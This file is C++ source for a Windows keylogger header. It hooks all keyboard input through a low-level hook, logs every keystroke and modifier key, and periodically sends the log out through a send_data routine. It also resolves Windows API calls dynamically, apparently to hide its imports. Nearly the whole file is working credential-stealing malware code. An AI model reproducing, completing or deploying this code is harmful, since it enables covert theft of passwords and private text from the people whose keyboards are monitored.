#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#define _WIN32_WINNT 0x0400
#pragma comment( lib, "user32.lib" )

#include <iostream>
#include <fstream>
#include "windows.h"
#include "keyboard_constants.h"

#include <ctime>
#include "send_data.h"

#include "prototypes.h"
#include "dynimp.h"

HHOOK eHook = NULL;
HANDLE hThread = NULL;
DWORD dwThread = NULL;
	
extern "C" __declspec(dllexport) std::string keylog = "";
		
__declspec(dllexport) LRESULT CALLBACK OurKeyboardProc (int nCode, WPARAM wparam, LPARAM lparam)
{
	
    DWORD SHIFT_key=0;
    DWORD CTRL_key=0;
    DWORD ALT_key=0;

	if (nCode < 0)
		CallNextHookEx(eHook, nCode,  wparam, lparam);

	KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam; 
	if ((nCode == HC_ACTION) && (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN))
	{
		
		if(kbs->vkCode >= 0x30 && kbs->vkCode <= 0x5A)
			keylog.push_back((char) kbs->vkCode);
		else
			keylog += Keys::KEYS[kbs->vkCode].Name;
		
		if (kbs->vkCode == VK_RETURN) 
			keylog += '\n'; 
		
		// Hook to finish
        SHIFT_key = GetAsyncKeyState(VK_SHIFT);
        CTRL_key = GetAsyncKeyState(VK_CONTROL);
        ALT_key = GetAsyncKeyState(VK_MENU);
		
	   if (CTRL_key !=0 && SHIFT_key !=0 && ALT_key !=0 && kbs->vkCode == 0x51 ) // 0x51 = 'Q'
		{
		  //std::cout << keylog.c_str();
		  PostQuitMessage(0);
		}
		
	} else if (wparam == WM_KEYUP || wparam  == WM_SYSKEYUP) {
		
		DWORD key = kbs->vkCode;
		if (key == VK_CONTROL 
				|| key == VK_LCONTROL 
				|| key == VK_RCONTROL 
				|| key == VK_SHIFT 
				|| key == VK_LSHIFT 
				|| key == VK_RSHIFT 
				|| key == VK_MENU 
				|| key == VK_LMENU 
				|| key == VK_RMENU 
				|| key == VK_CAPITAL 
				|| key == VK_NUMLOCK 
				|| key == VK_LWIN 
				|| key == VK_RWIN) 
			{
				string KeyName = Keys::KEYS[kbs->vkCode].Name;
				KeyName.insert (1, "/");
				keylog += KeyName;
			}
	}
	return CallNextHookEx(eHook, nCode,  wparam, lparam);
}

BOOL GetMessageWithTimeout(MSG *msg, UINT to)
{
    BOOL res;
    UINT_PTR timerId = SetTimer(NULL, NULL, to, NULL);
    res = GetMessage(msg,NULL,0,0);
    KillTimer(NULL, timerId);
    if (!res)
        return FALSE;
    if (msg->message == WM_TIMER && msg->hwnd == NULL && msg->wParam == timerId)
        return TRUE; //TIMEOUT! You could call SetLastError() or something...
    return TRUE;
}


void dll_keylogger_MessageLoop()
{
	std::clock_t start = std::clock();
	double duration;
	
    MSG message;
    while (GetMessageWithTimeout(&message,1000*60*10))//GetMessage(&message,NULL,0,0)) 
    {
        TranslateMessage( &message );
        DispatchMessage( &message );
		
		// Timed data send 
		duration = ( std::clock() - start ) / (double) CLOCKS_PER_SEC;
		if(duration > 3)
		{
			start = std::clock();
			
			if(keylog.length() > 5) 
			{
				send_data(keylog.c_str());
				keylog.clear();
			}
		}

    }
}



DWORD WINAPI dll_keylogger(LPVOID lpParm)
{
    HINSTANCE hInstance = GetModuleHandle(NULL);
    if (!hInstance) hInstance = LoadLibrary((LPCSTR) lpParm); 
    if (!hInstance) return 1;

	eHook = FNC(SetWindowsHookExA, "user32.dll") (
	//eHook = SetWindowsHookEx(
		WH_KEYBOARD_LL, 
		(HOOKPROC)OurKeyboardProc, 
		GetModuleHandle (NULL), 
		0
	);
    //eHook = SetWindowsHookEx (  WH_KEYBOARD_LL, (HOOKPROC) OurKeyboardProc,   hInstance,  NULL    );
	std::cout<<"thread created";
    dll_keylogger_MessageLoop();
    UnhookWindowsHookEx(eHook);
	std::cout<<"thread ended";
    return 0;
}


bool IsHooked ()
{
	return (bool) eHook != NULL;
}

bool InstallHook (char** argv)
{
	if(!IsHooked())
	{
		hThread = FNC(CreateThread,"Kernel32.dll")(
			NULL,
			NULL,
			(LPTHREAD_START_ROUTINE)dll_keylogger, 
			(LPVOID) argv[0], 
			NULL, 
			&dwThread
		);	

		if (hThread) 
			WaitForSingleObject(hThread,INFINITE);
		else
			return false;
		
		LPDWORD lpExitCode;
		GetExitCodeThread(hThread, lpExitCode);
		return *lpExitCode==0;
		
	} else
		return true;
}


#endif 
